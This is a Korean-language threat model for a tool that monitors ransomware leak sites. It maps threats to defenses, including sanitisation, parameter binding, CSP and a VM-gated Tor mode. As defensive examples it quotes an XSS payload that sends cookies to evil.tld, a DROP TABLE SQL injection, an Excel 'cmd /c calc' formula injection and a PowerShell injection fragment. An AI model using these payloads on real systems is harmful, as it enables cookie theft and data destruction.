# 보안 설계 문서 (Threat Model)

이 문서는 "다크웹 관련 도구를 내 PC에서 돌려도 안전한가?"에 대한 구체적인 답입니다.
각 위협에 대해 **어디서 어떻게 막는지**를 파일 단위로 명시합니다.

---

## 0. 신뢰 경계 (Trust Boundary)

```
  ┌─────────────────────────── 신뢰할 수 없는 영역 ───────────────────────────┐
  │  랜섬웨어 조직 DLS (.onion)                                                │
  │      ↓ (우리는 여기에 접속하지 않는다)                                      │
  │  공개 CTI 애그리게이터 — ransomware.live / ransomlook / ransomfeed         │
  └──────────────────────────────┬────────────────────────────────────────────┘
                                 │  HTTPS · 허용목록 · 크기상한 · 타입검사
  ┌──────────────────────────────▼───── 신뢰 경계 (여기서 전부 살균) ──────────┐
  │  packages/dc_safety/http.py  →  collector/sources/base.py (finalize)       │
  └──────────────────────────────┬────────────────────────────────────────────┘
                                 │  살균된 평문만 통과
  ┌──────────────────────────────▼──────── 신뢰 영역 ─────────────────────────┐
  │  SQLite (파라미터 바인딩) → export (URL 무력화) → 대시보드 (textContent)   │
  └───────────────────────────────────────────────────────────────────────────┘
```

**핵심 전제:** 애그리게이터 API의 응답 안에 들어 있는 문자열(기업명, 설명문, URL)은
**랜섬웨어 조직이 작성한 것**이다. 애그리게이터를 신뢰하더라도 그 *내용*은 적대적 입력이다.

---

## 1. 위협별 대응

### T1. 랜섬웨어 서버와의 직접 접촉으로 인한 감염·추적·법적 노출

| | |
|---|---|
| **위험** | .onion 접속 시 브라우저/클라이언트 취약점 공격, 악성 파일 자동 다운로드, 접속 로그 노출 |
| **대응** | 기본 모드는 **.onion 에 전혀 접속하지 않음.** Tor 설치 자체가 불필요 |
| **강제 지점** | `packages/dc_safety/http.py` — `ALLOWED_HOSTS` 에 `.onion` 이 없고 `_check_host()` 가 HTTPS + 허용목록을 강제. `collector/http_client.py` 는 이 이름을 넘겨주는 껍데기 |
| **예외 경로** | `tor/onion_crawler.py` — 3중 게이트(§2)를 모두 통과해야만 동작 |

### T2. SSRF / 네트워크 피벗

| | |
|---|---|
| **위험** | 소스 데이터에 심어진 URL로 내부망·클라우드 메타데이터(169.254.169.254)에 요청 |
| **대응** | 요청 URL은 **코드에 하드코딩된 상수만** 사용. 응답 안의 URL로는 절대 요청하지 않음 |
| **추가** | 리다이렉트를 자동으로 따라가지 않고(`allow_redirects=False`), 수동으로 `_check_host()` 재검증 후 최대 3홉 |
| **검증** | `tests/test_all.py` §3 — SSRF·메타데이터·서브도메인 위장·file 스킴 차단 확인 |

### T3. XSS (피해자명·설명문을 통한 스크립트 실행)

DLS 게시물 제목에 `</script><script>fetch('http://evil.tld/'+document.cookie)</script>` 가
들어 있다고 가정한다. 4중으로 막는다.

1. **수집 시 살균** — `safety.sanitize_text()` 가 태그 제거 → 엔티티 디코드 → 재검사
2. **내보내기 시 이스케이프** — `export.py` 가 `</` → `<\/`, U+2028/2029 이스케이프
   (`<script>` 태그 조기 종료 차단)
3. **렌더링 시 원천 차단** — 대시보드는 `.innerHTML` 을 **한 줄도 쓰지 않는다.**
   모든 데이터는 `createElement` + `textContent`
4. **CSP** — `default-src 'none'; connect-src 'none'` 로 만에 하나 실행돼도 외부로 나갈 수 없음

**검증:** `tests/test_all.py` §1, §7, §11 — 실제 페이로드 삽입 후 결과 검사 + 대시보드 소스 정적 검사

### T4. URL 오클릭으로 인한 사고 접속

| | |
|---|---|
| **위험** | 대시보드나 Slack 알림에서 .onion 링크를 무심코 클릭 |
| **대응** | `safety.defang_url()` — `http://x.onion/` → `hxxp://x[.]onion/`. 대시보드는 `<a href>` 자체를 만들지 않음 |
| **추가** | `javascript:` `data:` `vbscript:` `file:` 등 비-HTTP 스킴도 콜론을 무력화 (`javascript[:]`) |
| **UI** | .onion 항목에는 "일반 PC에서 절대 접속하지 마십시오" 경고를 함께 표시 |

### T5. SQL 인젝션

| | |
|---|---|
| **위험** | 그룹명이 `evil'; DROP TABLE victims;--` |
| **대응** | `store.py` 전 구간 **파라미터 바인딩만** 사용. 문자열 포매팅으로 SQL을 만드는 곳은 `IN (?,?,?)` 플레이스홀더 생성뿐이며 값은 바인딩 |
| **검증** | `tests/test_all.py` §8 |

### T6. 명령 주입 (알림 경로)

| | |
|---|---|
| **위험** | PowerShell 토스트에 피해자명을 문자열로 넣으면 `; Invoke-WebRequest ...` 실행 가능 |
| **대응** | 값을 스크립트에 **보간하지 않고 환경변수로 전달**하여 `$env:KRLEAK_TOAST_TITLE` 로 참조 |
| **추가** | 모든 `subprocess` 호출은 `shell=False` + 리스트 인자 + 타임아웃 |

### T7. CSV 인젝션 (엑셀 수식 실행)

| | |
|---|---|
| **위험** | 기업명이 `=cmd\|'/c calc'!A1` 일 때 CSV를 엑셀로 열면 실행 |
| **대응** | 대시보드 CSV 생성 시 `= + - @ tab CR` 로 시작하는 셀 앞에 `'` 를 붙여 무력화 |

### T8. 자원 고갈 (압축폭탄 / 초대형 응답)

| | |
|---|---|
| **대응** | 스트리밍 수신 중 32MiB 초과 시 즉시 중단. `Content-Length` 선언값도 사전 검사 |
| **추가** | 필드별 길이 상한(제목 300자, 설명 2000자), 대시보드는 1000행까지만 렌더링 |

### T9. XXE / XML 엔티티 폭탄 (RSS 소스)

| | |
|---|---|
| **대응** | `defusedxml` 이 있으면 사용. 없으면 응답 앞부분에 `<!DOCTYPE` / `<!ENTITY` 선언이 있는지 검사해 **파싱 자체를 거부** |

### T10. 터미널/에디터 스푸핑

| | |
|---|---|
| **위험** | ANSI 이스케이프로 로그 조작, 유니코드 BiDi override 로 `파일exe.txt` ↔ `파일txt.exe` 위장 |
| **대응** | `sanitize_text()` 가 제어문자(U+0000–U+001F) 와 BiDi(U+202A–U+202E, U+2066–U+2069) 제거. 로그 출력은 `safe_log_str()` 로 추가 이스케이프 |

### T11. 비밀정보 유출 / 수집 데이터의 실수 공개

| | |
|---|---|
| **대응** | `.env`(웹훅·SMTP), `config.json`, `data/`, `logs/`, `web/data/*`, `tor/captures/` 를 `.gitignore` 로 차단 |
| **웹훅** | URL은 `.env` 에서만 읽고 `hooks.slack.com` / `discord.com` 계열만 허용 |
| **원칙** | 코드는 공개 가능, 수집 데이터는 로컬 전용 |

### T12. 공급망 공격

| | |
|---|---|
| **대응** | 런타임 의존성 **`requests` 하나**, 버전 고정. 나머지는 표준 라이브러리 |
| **분리** | Tor 전용 의존성(`PySocks`)은 `requirements-tor.txt` 로 분리 — 호스트에 설치되지 않음 |

### T13. 로컬 서버 노출

| | |
|---|---|
| **대응** | `serve` 는 `127.0.0.1` 에만 바인딩. `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Cache-Control: no-store` 헤더 부착. 접근 로그 미기록 |

### T14. 권한 상승

| | |
|---|---|
| **대응** | 어디에서도 관리자 권한을 요구하지 않음. 작업 스케줄러도 SYSTEM이 아닌 **현재 사용자** 계정으로 등록 |

---

## 2. Tor 모듈 게이트 (선택 기능)

`.onion` 직접 크롤링은 위 보호를 의도적으로 깨는 행위이므로, **모두 통과해야만** 실행된다.

| 게이트 | 조건 | 구현 |
|---|---|---|
| 1 | `config.json` → `tor.enabled = true` | `safety.assert_tor_allowed()` |
| 2 | 실행 시 `--i-understand-the-risk` | `main.py` → `cmd_tor` |
| 3 | **VMware 가상머신에서 실행 중** | `safety.detect_hypervisor()` |

**게이트 3 판정 근거**

- Windows: `Win32_ComputerSystem.Manufacturer/Model`, `Win32_BIOS.Manufacturer/SerialNumber`,
  `C:\Program Files\VMware\VMware Tools\vmtoolsd.exe` 존재 여부
- Linux: `/sys/class/dmi/id/sys_vendor`, `/sys/class/dmi/id/product_name`, `systemd-detect-virt`

**모듈 내부 추가 방어**

- `.onion` 이외 호스트로는 요청 자체를 거부 (clearnet 유출·피벗 차단)
- SOCKS 프록시는 `127.0.0.1` 계열만 허용, `socks5h` 로 **DNS도 Tor가 처리** → 로컬 DNS 유출 없음
- 응답 4MiB 상한, Content-Type 화이트리스트, 링크 추적(crawl) 없음
- HTML은 `<script>/<style>/<iframe>` 통째로 제거 후 텍스트만 추출 → 즉시 폐기
- 원문 저장은 기본 OFF, 켜더라도 `tor/captures/` 는 `.gitignore` 로 커밋 차단
- 모듈은 **지연 임포트** — 기본 실행 경로에서는 로드조차 되지 않음

**운영 권장 사항**

1. 전용 VM + 깨끗한 스냅샷
2. 공유 폴더 / 드래그&드롭 / 클립보드 공유 **모두 해제**
3. 호스트 자격증명을 VM에 넣지 않기
4. 사용 후 **스냅샷으로 롤백**

---

## 3. 이 도구가 하지 않는 일

- 유출된 데이터 파일을 다운로드하지 않습니다
- 랜섬웨어 샘플이나 실행 파일을 취득하지 않습니다
- 피해 기업의 스크린샷·문서를 표시하지 않습니다 (CSP `img-src data:` 로 원격 이미지 차단)
- 협상 채팅·결제 페이지에 접근하지 않습니다
- 어떤 시스템에도 공격적 행위를 하지 않습니다
- 사용자 데이터를 외부로 전송하지 않습니다 (알림은 사용자가 명시적으로 설정한 채널만)

---

## 4. 자가 점검

```bash
python -m collector.main doctor    # 현재 환경 · 허용목록 · Tor 게이트 상태
python -m tests.test_all           # 149개 보안·기능 테스트
```

---

## 5. 취약점 제보

이 저장소의 코드에서 보안 문제를 발견하면 공개 이슈 대신 비공개로 알려주십시오.
